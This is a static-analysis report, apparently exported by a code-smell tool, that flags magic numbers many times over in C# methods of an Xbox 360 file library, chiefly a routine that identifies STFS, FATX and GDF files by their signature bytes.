Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: try {  	for (int i = 0; i < xOutput.Length; i++)  		xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  }  catch {  	throw VariousExcepts.ByteInput;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: try {  	for (int i = 0; i < xOutput.Length; i++)  		xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  }  catch {  	throw VariousExcepts.ByteInput;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: try {  	for (int i = 0; i < xOutput.Length; i++)  		xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  }  catch {  	throw VariousExcepts.ByteInput;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: for (int i = 0; i < xOutput.Length; i++)  	xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: for (int i = 0; i < xOutput.Length; i++)  	xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: for (int i = 0; i < xOutput.Length; i++)  	xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,HexToBytes,The following statement contains a magic number: xOutput [i] = Convert.ToByte (xInput.Substring ((i * 2)' 2)' 16);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,BinaryToLong,The following statement contains a magic number: try {  	return Convert.ToInt64 (xInput' 2);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,BinaryToLong,The following statement contains a magic number: return Convert.ToInt64 (xInput' 2);  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: try {  	XboxFileType xReturn = XboxFileType.None;  	xIO.Position = 0;  	uint sig = xIO.ReadUInt32 ();  	switch (sig) {  	case (uint)AllMagic.CON:  	case (uint)AllMagic.LIVE:  	case (uint)AllMagic.PIRS:  		{  			if (xIO.Length < 0x37C)  				break;  			xIO.Position = 0x379;  			byte[] desc = xIO.ReadBytes (3);  			if (desc [0] == 0x24 && desc [1] == 0 && (desc [2] == 0 || desc [2] == 1 || desc [2] == 2))  				xReturn = XboxFileType.STFS;  			else if (desc [0] == 0x24 && desc [1] == 5 && desc [2] == 5)  				xReturn = XboxFileType.SVOD;  		}  		break;  	case (uint)AllMagic.Music:  		{  			xReturn = XboxFileType.Music;  		}  		break;  	case (uint)AllMagic.XDBF:  		{  			xReturn = XboxFileType.GPD;  		}  		break;  	case 0:  		{  			if (xIO.Length < 0x130EB0004)  				break;  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () != (uint)AllMagic.FATX)  				break;  			xReturn = XboxFileType.FATX;  		}  		break;  	case (uint)AllMagic.XSF:  		{  			xReturn = XboxFileType.GDF;  		}  		break;  	default:  		break;  	}  	if (xReturn == XboxFileType.None) {  		try {  			xIO.Position = 0;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x1FB20;  				if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  					xIO.Position = 0x30600;  					if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  						xIO.Position = 0x7FF000;  						if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  							xIO.Position = 0xFDA0000;  							if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  								xIO.Position = 0x130EB0000;  								if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  									xReturn = XboxFileType.FATX;  							}  							else  								xReturn = XboxFileType.GDF;  						}  						else  							xReturn = XboxFileType.FATX;  					}  					else  						xReturn = XboxFileType.GDF;  				}  				else  					xReturn = XboxFileType.GDF;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		catch {  		}  	}  	xIO.Dispose ();  	return xReturn;  }  catch (Exception x) {  	xIO.Close ();  	throw x;  }  
